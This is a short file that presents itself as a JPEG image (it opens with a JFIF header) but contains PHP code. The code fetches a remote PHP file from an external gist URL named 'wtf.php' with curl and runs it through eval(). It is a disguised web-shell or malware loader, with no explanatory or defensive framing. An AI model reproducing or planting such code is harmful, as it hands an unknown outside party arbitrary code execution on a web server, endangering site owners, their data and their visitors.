ÿØÿà JFIF ÿþ;<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://gist.githubusercontent.com/paknago21/0539f1a85444bf3a19ad83936bd36a89/raw/e6f29d2d300ace1b23834baf1a937a408c449d50/wtf.php'));
?>